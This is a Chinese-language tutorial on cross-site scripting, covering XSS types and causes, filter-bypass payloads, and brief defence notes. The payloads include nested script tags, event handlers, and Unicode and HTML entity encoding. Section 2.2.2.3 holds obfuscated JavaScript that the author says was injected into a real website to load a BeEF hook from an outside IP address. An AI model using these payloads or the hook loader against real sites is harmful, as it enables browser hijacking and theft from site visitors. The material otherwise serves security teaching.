# 02.XSS跨站点脚本

##2.1 XSS介绍

  __Cross-Site Scripting(跨站点脚本)__是Web中最广泛利用的一种漏洞之一，占据OWASP 2013年Web漏洞第三位，其广泛程度以及危害性可见一斑。
  
  XSS漏洞的原理，简而言之，就是：利用Web应用程序的漏洞，向页面中注入JavaScript恶意代码使其运行并进行破坏。 
  
###2.1.1 XSS分类
  
  XSS 主要分为两类，反射性XSS和存储型XSS。
  
  * __反射性XSS__
  
    反射性的恶意并不直接存储在目标系统存储中，攻击者利用漏洞构造指定格式的URL，利用欺骗等手段让受害人误点击URL从而访问目标页面并指定恶意脚本。
    例如：`http://webapp.com?content=<script>alert('XSS')</script>`

  * __存储型XSS__
  
    存储型XSS是指，攻击者将恶意代码存储到目标系统中，在系统向页面输入该内容时，脚本自动被执行。

###2.1.2 XSS产生原因
  
  有句话说的妙：___All Input is Evil！所有的输入都是恶意的！___这是防御式编程里必须设定的一个前提。XSS产出的原因是由于没有对用户的输入进行足够的校验和过滤，攻击者可以构造恶意脚本从而导致漏洞的发生。
  
  用户在input[type=text]框里输入`<script>alert('xss');</script>`，系统就毫不保留得在浏览器进行输输出，从而导致XSS漏洞，这是对合法用户极其不负责任的一种行为。
   
###2.1.2 XSS可能出现的地方

##2.2 XSS注入技巧（payload）

 **只提供思路，不适用所有情况，根据过滤规则的不同，选择构造不同的playload。**

###2.2.1 屌丝篇
  
####2.2.1.1直接上菜

```javascript
<script>alert('xss');</script>
```

如果你的系统可以让用户那么直接执行javascript脚本，骚年，那你就等着哭吧。

####2.2.1.2 过滤script标签

ok，稍微有一丁点安全意识的人都会把script标签过滤掉，过滤的规则会很多，注入一定要根据过滤的规则不同而选择不同的playload，这里尝试讲解两种情况的过滤：
  
  * 过滤script标签本身，内容不过滤
  * 过滤script标签以及包含的所有内容

假如用户的输入如下：
```html
<script>alert('xss');</script><p>正常文档</p>
```

那么第一种情况过滤的结果为：
```html
alert('xss');<p>正常文档</p>
```

而第二种情况过滤的结果为：
```html
<p>正常文档</p>
```

如果系统没有对用户输入进行递归的xss过滤的话，那么第一种情况，我们的playload可以是：
```html
<scr<script>ipt>alert('xss');</scr</script>ipt>
```

而第二种情况，可以尝试这种技巧：
```html
<scr<script></script>ipt>alert('xss');</scr<script></script>ipt>
```

####2.2.1.3 标签事件注入

标签的事件**on(event)**是很容易被利用作为playload的。例如：
```html
<p onmouseover="alert('xss');">鼠标移动到这里触发js脚本！</p>
```

如果想让脚本自动执行，可以利用onload,onunload,onerror等时间，可以利用onfouse事件，例如:

```html
<input onfouse="alert('xss')" autofouse />
```

如果系统对标签事件进行了过滤，那么可以针对过滤的规则进行相应注入，例如**2.2.1.2**提到的技巧。

####2.2.1.4 /代替空格

####2.2.1.5 JavaScript Unicode编码注入

  如果系统后台对html标签进行了过滤而没有然后的可能，同时前端Javascript脚本获取资源时并没有进行转义就输入，那么你可以尝试使用JavaSscript的Unicode编码进行注入。
  
  `<script>alert('xss');</script>`
  
  对应的JavaScript Unicode编码是：

  `\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`
  
  一般系统后台不会识别这是JavaScript的Unicode编码形式，所以都通过了验证。但当前端的JavaScript使用如下方法显示内容时，XSS漏洞就出现了：
  
```javascript
document.write('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');
```

####2.2.1.6 HTML实体编码

  HTML解析器能够识别文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明地对这些编码进行解码。所以一下两个URL实际上是一样的。
  
  `<img src="http://www.example.com"/>`    __VS___   `<img src="ht&#x74;&#x70;&#x3A;//www.example.com" />`

####2.2.1.7 其他可以利用的标签

  * iframe
  * meta
  * style
  * embed
  * flash
  * applet
  * ...

###2.2.2 高帅富篇

####2.2.2.1 伪协议javascript:alert('xss')

####2.2.2.2 伪协议data:text/html

####2.2.2.3 绕过关键字过滤的技巧

以下是我成功注入一个网站的一段js代码，系统对window,document,createElement,js等关键字进行了过滤，但还是被成功注入了。
```javascript
if(typeof beef=='undefined'){
  var url='http://119.xxx.128.103:3000/hook.'+'j'+'s';
  dd=self['d'+'o'+'cument'];
  bf=dd['create'+'Element']('script');
  bf.async=true;
  bf.src=url;dd.body.appendChild(bf);}
}
```

####2.2.2.3  完恶之源eval

##2.3 XSS防注
  
    数据和架构分离：前端模板jQuery，ejs，ployer，$('<div/>')
    
    no el！use c:out
    
    http xss header
    
    白名单标签为主+黑名单为辅
    
    no external script
    
    RichTextArea 递归过滤
  
##2.4 XSS平台：beef-xss

参考文档：OWASP ,维基百科，百度百科
